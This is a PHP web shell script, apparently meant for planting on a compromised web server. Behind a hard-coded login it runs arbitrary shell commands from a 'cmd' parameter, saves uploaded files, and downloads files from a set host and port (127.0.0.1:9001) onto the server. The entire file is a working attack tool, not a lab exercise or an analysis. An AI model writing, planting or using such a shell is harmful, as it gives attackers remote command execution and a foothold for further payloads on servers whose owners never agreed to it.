<?php
	$loggedIn = FALSE;
	login();
	
	function displayForm() {
		if (!$GLOBALS['loggedIn']) {
			exit();
		}
		$output = "";
		$host = "127.0.0.1";
		$port = "9001";

		if (isset($_FILES['fileToUpload'])) {
			$output = "";
			$fileName = basename($_FILES["fileToUpload"]["name"]);
			$file_tmp =$_FILES['fileToUpload']['tmp_name'];
			move_uploaded_file($file_tmp, $fileName);
		}

		if (isset($_POST['remoteFile'])) {
			$output = "";
      file_put_contents($_POST['remoteFile'], file_get_contents("http://$host:$port/" . $_POST['remoteFile']));
    }
    if (isset($_GET['cmd'])) {
      $output .= "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
		}
		
		echo <<<HTML
			<html>
				<body>
					<form action="" method="POST" enctype="multipart/form-data">
						<input type="hidden" name="MAX_FILE_SIZE" value="1000000">
						<p> Local Upload: <input type="file" name="fileToUpload">
						<input type="submit" name="upload">
					</form>

					<br>

					<form action="" method="POST" enctype="multipart/form-data">
						<p> Fetch From Remote: <input type="text" name="remoteFile">
						<input type="submit" name="fetch">
					</form>

					<br>

					<form method="GET">
						<p>CMD: <input type="text" name="cmd">
							<input type="submit" value="Exec">
					</form>
					<pre>
						$output
					</pre>
			</body>
		</html>
HTML;
	}

	function login() {
		$masterUser = "blackadder";
		$masterPassword = "ca169b2bf2e2e2efc4f8638b2afc1a24d237da4ee03be6fb079e9ed9eac17dcdc3afe536ff6cedd39f28f4603fd1744b98df35f8308cfc6f8bcd74a21f52a90d";
		if (isset($_POST['username']) && isset($_POST['password'])) {
			if ($_POST['username'] === $masterUser and $_POST['password'] === $masterPassword) {
				$GLOBALS['loggedIn'] = TRUE;
				displayForm();
			}
		}
		echo <<<HTML
		<html>
				<body>
				<form method="POST">
					 <input type="text" title="username" placeholder="username" name="username"/>
					 <input type="password" title="username" placeholder="password" name="password"/>
					 <button type="submit" class="btn">Login</button>
				</form>
			 	</body>
	 </html>
HTML;
	}
	
	function logout() {
		return 0;
	}

?>
